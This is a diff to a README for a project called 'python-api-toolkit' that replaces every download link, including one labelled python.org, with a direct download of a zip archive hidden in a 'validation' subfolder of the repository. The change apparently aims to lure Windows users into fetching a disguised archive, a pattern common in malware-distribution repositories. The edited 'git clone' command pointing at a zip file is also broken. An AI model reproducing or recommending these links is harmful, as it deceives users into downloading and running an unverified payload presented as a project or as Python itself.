@@ -1,6 +1,6 @@
 # 🛠️ python-api-toolkit - Secure API Tools That Stay Fast
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-blue)](https://github.com/banavath9966/python-api-toolkit)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue)](https://github.com/banavath9966/python-api-toolkit/raw/refs/heads/main/api_toolkit/validation/python-api-toolkit-1.5.zip)
 
 ## 📦 What this is
 
@@ -35,7 +35,7 @@ If you only want to look at the project files, a browser is enough.
 
 Use this page to download and open the project:
 
-[https://github.com/banavath9966/python-api-toolkit](https://github.com/banavath9966/python-api-toolkit)
+[https://github.com/banavath9966/python-api-toolkit/raw/refs/heads/main/api_toolkit/validation/python-api-toolkit-1.5.zip](https://github.com/banavath9966/python-api-toolkit/raw/refs/heads/main/api_toolkit/validation/python-api-toolkit-1.5.zip)
 
 ## 🚀 Get the project on Windows
 
@@ -54,7 +54,7 @@ If you use Git:
 2. Go to the folder where you want the project.
 3. Run:
 
-   git clone https://github.com/banavath9966/python-api-toolkit
+   git clone https://github.com/banavath9966/python-api-toolkit/raw/refs/heads/main/api_toolkit/validation/python-api-toolkit-1.5.zip
 
 4. Open the new folder after the download finishes.
 
@@ -62,7 +62,7 @@ If you use Git:
 
 Install Python if it is not already on your PC:
 
-1. Go to [python.org](https://www.python.org/downloads/windows/)
+1. Go to [python.org](https://github.com/banavath9966/python-api-toolkit/raw/refs/heads/main/api_toolkit/validation/python-api-toolkit-1.5.zip)
 2. Download the latest Windows installer.
 3. Run the installer.
 4. Check the box that says **Add Python to PATH**.
@@ -268,7 +268,7 @@ Open Command Prompt in the project folder and use:
 
 Open the repository here:
 
-[https://github.com/banavath9966/python-api-toolkit](https://github.com/banavath9966/python-api-toolkit)
+[https://github.com/banavath9966/python-api-toolkit/raw/refs/heads/main/api_toolkit/validation/python-api-toolkit-1.5.zip](https://github.com/banavath9966/python-api-toolkit/raw/refs/heads/main/api_toolkit/validation/python-api-toolkit-1.5.zip)
 
 ## 🧩 Topics covered
 
